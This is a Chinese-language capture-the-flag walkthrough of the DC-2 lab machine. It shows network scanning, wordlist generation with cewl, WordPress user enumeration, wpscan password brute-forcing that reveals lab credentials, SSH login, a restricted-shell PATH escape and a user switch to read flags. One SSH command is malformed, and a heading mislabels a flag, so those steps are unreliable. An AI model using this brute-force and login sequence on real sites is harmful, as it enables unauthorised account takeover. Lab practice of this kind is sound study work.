### 扫描地址
```
┌──(kali㉿kali)-[~]
└─$ sudo arp-scan -l
[sudo] password for kali:
Interface: eth0, type: EN10MB, MAC: 00:0c:29:ae:51:81, IPv4: 192.168.7.128
WARNING: Cannot open MAC/Vendor file ieee-oui.txt: Permission denied
WARNING: Cannot open MAC/Vendor file mac-vendor.txt: Permission denied
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.7.1     00:50:56:c0:00:08       (Unknown)
192.168.7.2     00:50:56:e4:2a:ab       (Unknown)
192.168.7.129   00:0c:29:9e:63:89       (Unknown)
192.168.7.254   00:50:56:e7:52:95       (Unknown)
```

得到地址后

```
┌──(kali㉿kali)-[~]
└─$ nmap 192.168.7.129 -p 1-65535
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-05 09:19 EDT
Nmap scan report for 192.168.7.129
Host is up (0.00070s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE
80/tcp   open  http
7744/tcp open  raqmon-pdu
MAC Address: 00:0C:29:9E:63:89 (VMware)
```

`80`端口发生``302``跳转 http://dc-2/
手动`hosts`添加后进入web
提示可以使用[[cewl]]
`7744` 不知道是啥
丢进浏览器也不是web

[[cewl]]是一个字典生成器，它从指定url读取字符串

```
cewl http://dc-2/ >> 11.txt
```


[[dirsearch]]

```
dirsearch -u http://dc-2/
dirsearch -u 192.168.7.129
```

看到了wp

[[wpscan]]

### 枚举用户

```
wpscan --url http://dc-2/ -e u
```

##### 几个用户名建txt丢进去

```
admin
jerry
tom
```

### 与[[cewl]]得到的字典组合

```
wpscan --url http://dc-2/ -U user.txt -P 11.txt
```

```
[!] Valid Combinations Found:
 | Username: jerry, Password: adipiscing
 | Username: tom, Password: parturient
```

```
http://dc-2/wp-admin
```
### 登录后可以看到flag2


### 使用ssh登录tom

```
ssh tom@ -p192.168.7.129 7744
```

### 添加PATH使用更多命令

```
export PATH=/bin:$PATH
```

### 由此查看flag3

```
tom@DC-2:~$ su jerry
jerry@DC-2:~$ ls
flag4.txt
```

### 得到flag4

```
jerry@DC-2:~$ cat flag4.txt
Good to see that you've made it this far - but you're not home yet.

You still need to get the final flag (the only flag that really counts!!!).

No hints here - you're on your own now.  :-)

Go on - git outta here!!!!
```